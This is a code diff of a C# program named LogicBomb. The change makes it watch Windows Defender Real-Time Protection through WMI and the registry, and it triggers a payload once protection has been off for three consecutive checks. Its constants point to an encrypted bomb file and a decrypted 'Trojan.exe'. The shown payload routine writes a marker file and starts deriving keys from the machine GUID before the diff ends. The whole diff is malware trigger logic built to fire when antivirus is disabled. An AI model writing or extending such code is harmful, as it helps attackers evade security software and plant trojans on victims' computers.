@@ -20,15 +20,13 @@ namespace LogicBomb
         private const string MarkerName = "activated.txt";
         private const string EncryptedBombName = "bomb.encrypted";
         private const string DecryptedTrojanName = "Trojan.exe";
-        private const string DefenderServiceName = "WinDefend";
-
         private const int CheckIntervalSeconds = 10;
         private const int ConsecutiveChecksRequired = 3;
 
         private static string logFile;
         private static CancellationTokenSource cts = new CancellationTokenSource();
         private static int consecutiveDownChecks = 0;
-        private static bool lastDefenderStatus = true; // Assume running initially
+        private static bool lastRealtimeProtectionStatus = true; // Assume enabled initially
 
         static void Main(string[] args)
         {
@@ -46,9 +44,9 @@ namespace LogicBomb
                 cts.Cancel();
             };
 
-            Console.WriteLine($"[LogicBomb] Watching Windows Defender service: {DefenderServiceName}");
+            Console.WriteLine($"[LogicBomb] Monitoring Windows Defender Real-Time Protection");
             Console.WriteLine($"[LogicBomb] Check interval: {CheckIntervalSeconds} seconds");
-            Console.WriteLine($"[LogicBomb] Trigger after {ConsecutiveChecksRequired} consecutive 'down' checks");
+            Console.WriteLine($"[LogicBomb] Trigger after {ConsecutiveChecksRequired} consecutive 'disabled' checks");
             Console.WriteLine();
 
             try
@@ -69,35 +67,35 @@ namespace LogicBomb
             {
                 while (!token.IsCancellationRequested)
                 {
-                    bool defenderRunning = IsDefenderRunning();
+                    bool realtimeProtectionEnabled = IsRealtimeProtectionEnabled();
 
                     // Log status changes only
-                    if (defenderRunning != lastDefenderStatus)
+                    if (realtimeProtectionEnabled != lastRealtimeProtectionStatus)
                     {
-                        if (defenderRunning)
+                        if (realtimeProtectionEnabled)
                         {
-                            LogWarning("Windows Defender service is now RUNNING");
-                            LogEvent("defender_status", DefenderServiceName, "status_change", "running");
+                            LogWarning("Windows Defender Real-Time Protection is now ENABLED");
+                            LogEvent("realtime_protection", "RTP", "status_change", "enabled");
                             consecutiveDownChecks = 0;
                         }
                         else
                         {
-                            LogWarning("Windows Defender service is now STOPPED");
-                            LogEvent("defender_status", DefenderServiceName, "status_change", "stopped");
+                            LogWarning("Windows Defender Real-Time Protection is now DISABLED");
+                            LogEvent("realtime_protection", "RTP", "status_change", "disabled");
                         }
-                        lastDefenderStatus = defenderRunning;
+                        lastRealtimeProtectionStatus = realtimeProtectionEnabled;
                     }
 
-                    // Count consecutive down checks
-                    if (!defenderRunning)
+                    // Count consecutive disabled checks
+                    if (!realtimeProtectionEnabled)
                     {
                         consecutiveDownChecks++;
-                        Console.WriteLine($"[LogicBomb] Defender down - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");
+                        Console.WriteLine($"[LogicBomb] Real-Time Protection disabled - Check {consecutiveDownChecks}/{ConsecutiveChecksRequired}");
 
                         if (consecutiveDownChecks >= ConsecutiveChecksRequired)
                         {
-                            LogWarning($"Defender has been down for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
-                            LogEvent("trigger", DefenderServiceName, "trigger_activated", $"defender_down_{ConsecutiveChecksRequired}_checks");
+                            LogWarning($"Real-Time Protection has been disabled for {ConsecutiveChecksRequired} consecutive checks. TRIGGERING PAYLOAD!");
+                            LogEvent("trigger", "RTP", "trigger_activated", $"rtp_disabled_{ConsecutiveChecksRequired}_checks");
 
                             TriggerPayload();
                             break; // Exit after triggering
@@ -105,7 +103,7 @@ namespace LogicBomb
                     }
                     else
                     {
-                        // Reset counter if defender comes back up
+                        // Reset counter if protection comes back
                         if (consecutiveDownChecks > 0)
                         {
                             consecutiveDownChecks = 0;
@@ -126,28 +124,59 @@ namespace LogicBomb
             }
         }
 
-        private static bool IsDefenderRunning()
+        private static bool IsRealtimeProtectionEnabled()
         {
             try
             {
-                using (ServiceController sc = new ServiceController(DefenderServiceName))
+                // Method 1: Check via WMI (most reliable)
+                using (var searcher = new ManagementObjectSearcher(@"root\Microsoft\Windows\Defender", "SELECT * FROM MSFT_MpComputerStatus"))
                 {
-                    return sc.Status == ServiceControllerStatus.Running;
+                    foreach (ManagementObject queryObj in searcher.Get())
+                    {
+                        var rtpEnabled = queryObj["RealTimeProtectionEnabled"];
+                        if (rtpEnabled != null)
+                        {
+                            bool enabled = Convert.ToBoolean(rtpEnabled);
+                            return enabled;
+                        }
+                    }
                 }
             }
-            catch (InvalidOperationException)
+            catch (ManagementException mex)
             {
-                // Service doesn't exist
-                LogWarning($"Service '{DefenderServiceName}' not found on this system");
-                return false;
+                LogWarning($"WMI query failed: {mex.Message}");
+
+                // Method 2: Fallback to Registry check
+                try
+                {
+                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
+                    {
+                        if (key != null)
+                        {
+                            object disableValue = key.GetValue("DisableRealtimeMonitoring");
+                            if (disableValue != null)
+                            {
+                                int disabled = Convert.ToInt32(disableValue);
+                                // If DisableRealtimeMonitoring = 1, it's disabled, so RTP is NOT enabled
+                                return disabled == 0;
+                            }
+                        }
+                    }
+                }
+                catch (Exception regEx)
+                {
+                    LogWarning($"Registry check failed: {regEx.Message}");
+                }
             }
             catch (Exception ex)
             {
-                LogError($"Failed to check Defender status: {ex.Message}");
-                LogEvent("error", DefenderServiceName, "check_failed", ex.Message);
-                // Assume running on error to avoid false triggers
-                return true;
+                LogError($"Failed to check Real-Time Protection: {ex.Message}");
+                LogEvent("error", "RTP", "check_failed", ex.Message);
             }
+
+            // Assume enabled on error to avoid false triggers
+            LogWarning("Could not determine RTP status, assuming enabled");
+            return true;
         }
 
         private static void TriggerPayload()
@@ -160,7 +189,7 @@ namespace LogicBomb
                 // Create marker file
                 string markerPath = Path.Combine(ResultDir, MarkerName);
                 File.WriteAllText(markerPath,
-                    $"Activated by Windows Defender going down at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
+                    $"Activated by Windows Defender Real-Time Protection being disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}\r\n");
                 Console.WriteLine("[LogicBomb] Created marker: " + markerPath);
 
                 // Get local machine GUID and derive keys
